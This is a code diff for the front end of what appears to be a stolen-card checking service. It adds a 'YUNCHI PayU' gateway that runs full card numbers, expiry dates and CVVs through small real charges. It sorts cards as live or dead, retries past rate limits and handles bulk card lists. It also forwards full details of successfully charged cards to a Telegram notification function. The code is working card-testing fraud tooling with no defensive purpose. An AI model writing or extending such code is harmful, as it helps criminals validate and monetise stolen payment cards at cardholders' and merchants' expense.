@@ -215,6 +215,19 @@ const gateways: Gateway[] = [
     icon: CreditCard,
     iconColor: "text-cyan-500"
   },
+  { 
+    id: "payu_charge",
+    name: "YUNCHI PayU", 
+    code: "PayU",
+    type: "charge",
+    status: "online", 
+    cardTypes: "Visa/MC/RuPay",
+    speed: "⚡ Blazing",
+    successRate: "85%",
+    description: "₹1-₹500 Custom Charge • CVC required",
+    icon: Zap,
+    iconColor: "text-orange-500"
+  },
 ];
 
 // Credit costs: LIVE = 2 credits, DEAD = 1 credit, ERROR/UNKNOWN = 0 credits
@@ -258,6 +271,7 @@ const Gateways = () => {
   const [expMonth, setExpMonth] = useState("");
   const [expYear, setExpYear] = useState("");
   const [cvv, setCvv] = useState("");
+  const [payuAmount, setPayuAmount] = useState<number>(1); // PayU custom amount (default ₹1)
   const [checking, setChecking] = useState(false);
   const [result, setResult] = useState<CheckResult | null>(null);
   const [userCredits, setUserCredits] = useState<number>(0);
@@ -749,6 +763,87 @@ const Gateways = () => {
     };
   };
 
+  // PayU API check with custom amount via edge function with retry
+  const checkCardViaPayU = async (cardNumber: string, month: string, year: string, cvv: string, amount: number = 1, maxRetries = 5): Promise<GatewayApiResponse> => {
+    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
+    
+    for (let attempt = 0; attempt <= maxRetries; attempt++) {
+      try {
+        console.log(`[PAYU] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc, `Amount: ₹${amount}`);
+        
+        const { data, error } = await supabase.functions.invoke('payu-check', {
+          body: { cc, amount }
+        });
+        
+        if (error) {
+          console.error('[PAYU] Edge function error:', error);
+          if (attempt < maxRetries) {
+            await new Promise(r => setTimeout(r, 500 + attempt * 200));
+            continue;
+          }
+          return {
+            status: "unknown",
+            apiStatus: "ERROR",
+            apiMessage: error.message || "Edge function error",
+            rawResponse: JSON.stringify(error)
+          };
+        }
+        
+        console.log('[PAYU] API response:', data);
+        
+        // Extract real API response data
+        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
+        const apiMessage = data?.apiMessage || data?.message || 'No message';
+        const apiTotal = `₹${amount}`;
+        const rawResponse = data?.rawResponse || JSON.stringify(data);
+        
+        // Use status from edge function
+        const status = data?.status;
+        if (status === "live" || status === "dead") {
+          return { status, apiStatus, apiMessage, apiTotal, rawResponse };
+        }
+        
+        // Fallback: Check message for status indicators
+        const message = (apiMessage as string)?.toLowerCase() || '';
+        if (message.includes('success') || message.includes('approved') || message.includes('charged') || message.includes('payment successful')) {
+          return { status: "live", apiStatus, apiMessage, apiTotal, rawResponse };
+        }
+        if (message.includes('decline') || message.includes('failed') || message.includes('invalid') || message.includes('expired') || message.includes('rejected')) {
+          return { status: "dead", apiStatus, apiMessage, apiTotal, rawResponse };
+        }
+        
+        // Rate limit or timeout - retry
+        if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
+          console.log(`[PAYU] Retryable error detected: ${message}`);
+          if (attempt < maxRetries) {
+            await new Promise(r => setTimeout(r, 800 + attempt * 300));
+            continue;
+          }
+        }
+        
+        return { status: "unknown", apiStatus, apiMessage, apiTotal, rawResponse };
+      } catch (error) {
+        console.error('[PAYU] API check error:', error);
+        if (attempt < maxRetries) {
+          await new Promise(r => setTimeout(r, 500 + attempt * 200));
+          continue;
+        }
+        return {
+          status: "unknown",
+          apiStatus: "ERROR",
+          apiMessage: error instanceof Error ? error.message : "Unknown error",
+          rawResponse: String(error)
+        };
+      }
+    }
+    return {
+      status: "unknown",
+      apiStatus: "ERROR",
+      apiMessage: "Max retries exceeded",
+      rawResponse: "Max retries exceeded"
+    };
+  };
+
   // B3 API check (YUNCHI AUTH 3) via edge function with retry - returns status AND API response
   const checkCardViaB3 = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<GatewayApiResponse> => {
     const cc = `${cardNumber}|${month}|${year}|${cvv}`;
@@ -964,6 +1059,8 @@ const Gateways = () => {
         gatewayResponse = await checkCardViaB3(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
       } else if (selectedGateway.id === "paygate_charge") {
         gatewayResponse = await checkCardViaPaygate(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
+      } else if (selectedGateway.id === "payu_charge") {
+        gatewayResponse = await checkCardViaPayU(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv, payuAmount);
       }
       
       const checkStatus = gatewayResponse ? gatewayResponse.status : await simulateCheck();
@@ -1102,6 +1199,27 @@ const Gateways = () => {
               response_message: realResponseMessage,
               amount: "$0 Auth",
               gateway: `YUNCHI AUTH 2 (${usedApiLabel})`,
+              api_response: gatewayResponse.rawResponse
+            }
+          });
+        } catch (notifyError) {
+          console.log("Failed to send Telegram notification:", notifyError);
+        }
+      }
+
+      // Send Telegram notification for PayU checks (LIVE ONLY)
+      if (selectedGateway.id === "payu_charge" && gatewayResponse && checkStatus === "live") {
+        try {
+          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+          
+          await supabase.functions.invoke('notify-charged-card', {
+            body: {
+              user_id: userId,
+              card_details: fullCardString,
+              status: "CHARGED",
+              response_message: realResponseMessage,
+              amount: `₹${payuAmount}`,
+              gateway: "YUNCHI PayU",
               api_response: gatewayResponse.rawResponse
             }
           });
@@ -1702,6 +1820,8 @@ const Gateways = () => {
           gatewayResponse = await checkCardViaB3(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "paygate_charge") {
           gatewayResponse = await checkCardViaPaygate(cardData.card, cardData.month, cardData.year, cardData.cvv);
+        } else if (selectedGateway.id === "payu_charge") {
+          gatewayResponse = await checkCardViaPayU(cardData.card, cardData.month, cardData.year, cardData.cvv, payuAmount);
         }
         
         const checkStatus = gatewayResponse ? gatewayResponse.status : await simulateCheck();
@@ -1843,6 +1963,27 @@ const Gateways = () => {
                 response_message: realResponseMessage,
                 amount: "$0 Auth",
                 gateway: `YUNCHI AUTH 2 (${usedApiLabel})`,
+                api_response: gatewayResponse.rawResponse
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
+
+        // Send Telegram notification for PayU checks (LIVE ONLY) in bulk
+        if (selectedGateway.id === "payu_charge" && gatewayResponse && checkStatus === "live") {
+          try {
+            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+            
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: "CHARGED",
+                response_message: realResponseMessage,
+                amount: `₹${payuAmount}`,
+                gateway: "YUNCHI PayU",
                 api_response: gatewayResponse.rawResponse
               }
             });
@@ -2650,6 +2791,50 @@ const Gateways = () => {
                     />
                   </div>
                 </div>
+
+                {/* PayU Custom Amount Input */}
+                {selectedGateway?.id === "payu_charge" && (
+                  <div className="p-3 rounded-lg bg-orange-500/10 border border-orange-500/30 space-y-2">
+                    <div className="flex items-center gap-2">
+                      <Label htmlFor="payuAmount" className="text-xs font-semibold text-orange-400">Charge Amount (₹)</Label>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <Input
+                        id="payuAmount"
+                        type="number"
+                        min="1"
+                        max="500"
+                        value={payuAmount}
+                        onChange={(e) => {
+                          const val = parseInt(e.target.value) || 1;
+                          setPayuAmount(Math.min(500, Math.max(1, val)));
+                        }}
+                        className="font-mono w-24"
+                        disabled={checking}
+                      />
+                      <div className="flex gap-1">
+                        {[1, 5, 10, 50, 100].map((amt) => (
+                          <button
+                            key={amt}
+                            type="button"
+                            onClick={() => setPayuAmount(amt)}
+                            className={`px-2 py-1 text-xs rounded border ${
+                              payuAmount === amt 
+                                ? 'bg-orange-500 text-white border-orange-500' 
+                                : 'bg-secondary border-border hover:border-orange-500/50'
+                            }`}
+                            disabled={checking}
+                          >
+                            ₹{amt}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+                    <p className="text-[10px] text-muted-foreground">
+                      This amount will be charged to the card. Range: ₹1 - ₹500
+                    </p>
+                  </div>
+                )}
               </div>
 
               {result && (
@@ -2710,7 +2895,13 @@ const Gateways = () => {
                       <span className="w-24 text-muted-foreground font-bold italic">AMOUNT</span>
                       <span className="text-muted-foreground font-bold italic mr-2">:</span>
                       <span className="text-foreground font-bold italic">
-                        {selectedGateway?.type === "charge" ? "$1 CHARGE" : "$0 AUTH"}
+                        {selectedGateway?.id === "payu_charge" 
+                          ? `₹${payuAmount} CHARGE` 
+                          : selectedGateway?.id === "paygate_charge"
+                            ? "$14 CHARGE"
+                            : selectedGateway?.type === "charge" 
+                              ? "$1 CHARGE" 
+                              : "$0 AUTH"}
                       </span>
                     </div>
                     
@@ -2836,6 +3027,50 @@ const Gateways = () => {
                   </Button>
                 </div>
               </div>
+
+              {/* PayU Custom Amount Input for Bulk */}
+              {selectedGateway?.id === "payu_charge" && (
+                <div className="p-3 rounded-lg bg-orange-500/10 border border-orange-500/30 space-y-2">
+                  <div className="flex items-center gap-2">
+                    <Label className="text-xs font-semibold text-orange-400">Charge Amount (₹)</Label>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <Input
+                      type="number"
+                      min="1"
+                      max="500"
+                      value={payuAmount}
+                      onChange={(e) => {
+                        const val = parseInt(e.target.value) || 1;
+                        setPayuAmount(Math.min(500, Math.max(1, val)));
+                      }}
+                      className="font-mono w-24"
+                      disabled={bulkChecking}
+                    />
+                    <div className="flex gap-1 flex-wrap">
+                      {[1, 5, 10, 50, 100].map((amt) => (
+                        <button
+                          key={amt}
+                          type="button"
+                          onClick={() => setPayuAmount(amt)}
+                          className={`px-2 py-1 text-xs rounded border ${
+                            payuAmount === amt 
+                              ? 'bg-orange-500 text-white border-orange-500' 
+                              : 'bg-secondary border-border hover:border-orange-500/50'
+                          }`}
+                          disabled={bulkChecking}
+                        >
+                          ₹{amt}
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+                  <p className="text-[10px] text-muted-foreground">
+                    Each card will be charged ₹{payuAmount}. Range: ₹1 - ₹500
+                  </p>
+                </div>
+              )}
+
               <div>
                 <Label className="text-xs">Cards (one per line)</Label>
                 <Textarea
